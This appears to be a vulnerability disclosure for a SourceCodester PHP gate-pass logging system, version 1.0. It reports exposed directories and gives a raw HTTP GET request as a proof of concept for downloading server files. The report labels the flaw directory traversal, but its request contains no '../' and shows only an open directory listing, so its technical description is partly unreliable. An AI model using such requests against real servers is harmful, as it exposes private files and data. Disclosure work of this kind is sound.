## Affected version: 
Employee and visitor pass logging system exposed to directory traversal vulnerability - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/database/
/employee_gatepass/dist/
/employee_gatepass/libs/
/employee_gatepass/uploads/
## Description:
The employee and visitor pass login system 1.0 has an unrestricted directory traversal attack, the attack method is /employee_gatepass/database/
/employee_gatepass/dist/
/employee_gatepass/libs/
/employee_gatepass/uploads/. Accessing the following route will allow unrestricted access to any file in the directory and can directly download it, thereby obtaining sensitive information from the server.
Status: CRITICAL

POC
```
GET /employee_gatepass/dist/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4bo37p217s2osfnh7ovs48s6p9
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
![CleanShot 2025-03-13 at 19 53 03@2x](https://github.com/user-attachments/assets/bb102094-1a57-4622-9c31-7680683b75e0)

![CleanShot 2025-03-13 at 19 53 22@2x](https://github.com/user-attachments/assets/c52cbf4d-3152-4a4b-a165-28299fd2060c)


## code analysis:

The program does not adequately filter directory jump characters such as ../ entered by users, allowing malicious users to traverse any files on the server by submitting directory jumps.
![CleanShot 2025-03-13 at 19 55 21@2x](https://github.com/user-attachments/assets/858666c8-94b8-460f-b8ba-684e20cfbba3)
![CleanShot 2025-03-13 at 19 56 57@2x](https://github.com/user-attachments/assets/982c3f8b-df7e-419e-95cb-352c03c3487c)



